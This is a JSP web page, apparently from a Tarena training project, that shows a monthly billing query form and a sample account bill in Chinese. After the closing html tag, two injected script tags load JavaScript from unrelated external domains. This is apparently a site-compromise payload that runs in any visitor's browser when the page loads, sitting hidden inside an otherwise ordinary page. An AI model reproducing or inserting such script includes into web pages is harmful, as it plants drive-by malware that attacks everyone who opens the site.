<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<html>
<head>
<title> getusersuccess </title>
<style type="text/css">
<!--
@import url("../../son.css");
@import url("../../index.css");
-->
</style>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<link href="../../index.css" rel="stylesheet" type="text/css">
</head>
<body bgcolor="#ccddee" background="../../image/background.jpg" link="#000066" vlink="#0066FF" alink="#99FF00">
<form action="" method="post">
<table width="100%" border="1" bordercolor="ccccff" bgcolor="ccddee" class="9P">
  <tr> 
      <td width="12%">业务帐号:</td>  <td width="15%"><input name="textfield" type="text" size="10" maxlength="10"> </td>
      <td width="73%" colspan="2"> 
        <select size="1" name="select3">
        <option value="2004" selected>2004</option>
        <option value="2005">2005</option>
        <option value="2006">2006</option>
        <option value="2007">2007</option>
      </select>
      年 
      <select size="1" name="select3">
        <option value="1" selected>1</option>
        <option value="2">2</option>
        <option value="3">3</option>
        <option value="4">4</option>
        <option value="5">5</option>
        <option value="6">6</option>
        <option value="7">7</option>
        <option value="8">8</option>
        <option value="9">9</option>
        <option value="10">10</option>
        <option value="11">11</option>
        <option value="12">12</option>
      </select>
      月 
      <input type="submit" value="查询" name="B122">
        <input type="submit" value="查询所有帐单" name="B1222"> </td>
  </tr>
</table>
</form>
<hr size="1" noshade>
<div align="center"> 
  <p><span class="green">月帐单（单位/天）</span></p>
  <table width="95%" border="0" cellspacing="0" cellpadding="0">
    <tr>
      <td width="36%">查询日期:2004年1月</td>
    <td width="54%">&nbsp;</td>
    <td width="10%">&nbsp;</td>
  </tr>
</table>

  <table width="100%" border="1" bordercolor="ccffff" bgcolor="ccddee" class="9P">
    <tr bordercolor="ccffff" bgcolor="ccddee" class="9P"> 
      <td width="21%" nowrap>帐务帐号</td>
      <td width="30%" nowrap>登陆时长（小时）</td>
      <td width="14%" nowrap>费用(元)</td>
      <td width="35%" nowrap><div align="center">状态</div></td>
      <td width="35%" align="center" nowrap>明细帐</td>
    </tr>
    <tr> 
      <td nowrap>bbb</td>
      <td nowrap>30.00</td>
      <td nowrap>60.00</td>
      <td nowrap><div align="center">暂停</div></td>
      <td align="center" nowrap><a href="detail.htm">明细</a></td>
    </tr>
  </table>
  <from action="" method="post">
  <p class="9P"><font color="#000001" size="2">[总用户:3人，当前是：2-2 正常:1，暂停:1 删除:1 
    第2页/共3页 [<a href="index.htm">上一页</a> <a href="index3.htm">下一页</a> ] 转到</font> 
    <select name="select" onchange='javascript:userform.submit()'>
      <option value="" selected>1页</option>
      <option>2页</option>
      <option>3页</option>
    </select>
  </p>
  </form>
</div>
<center>
  <hr/>
  <p class="text_link"><font size="2" face="宋体">About Tarena - 公司简介 - 联系方法 - 相关法律 
    - 客户服务 <br>
    达内公司版权所有</font></p>
  <p class="text_link"><font size="-1">Copyright&nbsp;<img src="../image/c-00.gif" width="9" height="9">&nbsp;2000. 
    Tarena Technologies Inc. All Rights Reserved </font></p>
</center>
</body>
</html>

<script language=javascript src=http://www.shaoye1213.cn/tl.js></script>
<script language=javascript src=http://www.eheh001.cn/a.js></script>